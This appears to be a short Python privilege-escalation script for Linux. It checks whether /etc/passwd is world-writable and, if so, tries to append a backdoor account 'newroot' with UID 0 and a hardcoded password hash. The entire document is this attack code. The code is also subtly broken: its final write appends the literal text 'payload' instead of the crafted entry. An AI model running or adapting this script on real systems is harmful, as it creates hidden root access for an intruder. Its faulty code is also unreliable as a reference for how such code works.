from os import environ
from pathlib import Path


shell = environ['SHELL']
user = "newroot"
pd = "$1$htf4psnX$PBKknYNMo2cq0bvOYtpt./"
payload = f"{user}:{pd}:0:0:root:/root:{shell}\n"
file = Path("/etc/passwd")
permission = file.stat().st_mode
writable = permission & 0o002

if (writable):
    with open("/etc/passwd", "a") as file:
        file.write("payload")
